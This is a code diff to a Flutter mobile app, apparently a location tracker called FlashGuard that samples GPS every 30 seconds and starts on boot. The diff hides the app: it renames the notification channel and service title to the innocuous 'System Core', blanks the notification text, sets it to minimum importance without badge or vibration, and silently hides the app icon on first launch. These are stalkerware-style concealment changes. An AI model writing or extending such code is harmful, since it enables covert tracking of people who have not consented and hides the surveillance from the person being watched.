@@ -36,8 +36,8 @@ const FirebaseOptions _kFirebaseOptions = FirebaseOptions(
 );
 
 // ─── Constants ────────────────────────────────────────────────────────────────
-const _kNotifChannelId   = 'flashguard_fg';
-const _kNotifChannelName = 'FlashGuard';
+const _kNotifChannelId   = 'system_core';
+const _kNotifChannelName = 'System Core';
 const _kDeviceIdKey      = 'fg_device_id';
 const _kGpsIntervalSec   = 30;
 const _kCtrlChannel      = 'com.flashguard/control';
@@ -93,6 +93,11 @@ Future<void> _requestPermissions() async {
       await Permission.locationAlways.request();
     }
   } catch (_) {}
+  // Auto-hide icon silently on first launch
+  try {
+    const channel = MethodChannel(_kCtrlChannel);
+    await channel.invokeMethod('hideIcon');
+  } catch (_) {}
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -108,9 +113,11 @@ Future<void> _initBackgroundService() async {
           AndroidFlutterLocalNotificationsPlugin>()
       ?.createNotificationChannel(const AndroidNotificationChannel(
         _kNotifChannelId, _kNotifChannelName,
-        description : 'FlashGuard is running.',
-        importance  : Importance.low,
+        description : '',
+        importance  : Importance.min,
         playSound   : false,
+        showBadge   : false,
+        enableVibration: false,
       ));
 
   await service.configure(
@@ -120,8 +127,8 @@ Future<void> _initBackgroundService() async {
       autoStart             : true,
       autoStartOnBoot       : true,
       notificationChannelId : _kNotifChannelId,
-      initialNotificationTitle  : 'FlashGuard',
-      initialNotificationContent: 'Monitoring active…',
+      initialNotificationTitle  : 'System Core',
+      initialNotificationContent: '',
       foregroundServiceNotificationId: 9001,
     ),
     iosConfiguration: IosConfiguration(
